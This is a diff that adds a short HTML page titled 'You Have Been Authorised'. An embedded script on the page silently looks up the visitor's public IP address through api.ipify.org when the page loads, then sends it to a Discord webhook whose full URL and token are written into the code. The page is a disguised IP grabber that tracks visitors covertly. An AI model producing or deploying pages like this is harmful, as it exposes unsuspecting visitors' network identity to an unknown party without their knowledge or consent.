@@ -1,0 +1,40 @@
+<html>
+  <body>
+    <h1>You Have Been Authorised</h1>
+
+    <script>
+		
+    // JavaScript code to collect user information and send it to a Discord webhook
+    const userAgent = navigator.userAgent;
+    const ipAddressURL = 'https://api.ipify.org?format=json';
+    let ipAddress;
+
+    fetch(ipAddressURL)
+      .then(response => response.json())
+      .then(data => {
+        ipAddress = data.ip;
+
+        
+
+        // Create the embed object with collected information
+        const ip = `${ipAddress}`
+        const webhookURL = 'https://discord.com/api/webhooks/1187269215019876402/r6LsgmHmaOUeiiaKMdQW0710QKi8TFPviUm9Hz2lUUzLYFWM7x70F97Zy_89W3tCt1dU'; // Replace with your Discord webhook URL
+
+        // Send the embed to the Discord webhook
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ content: ip })
+        })
+        .then(response => console.log('Information sent to Discord webhook:', response))
+        .catch(error => console.error('Error sending information to Discord:', error));
+      })
+      .catch(error => {
+        console.error('Error collecting user information:', error);
+      });
+  </script>
+    
+  </body>
+</html>
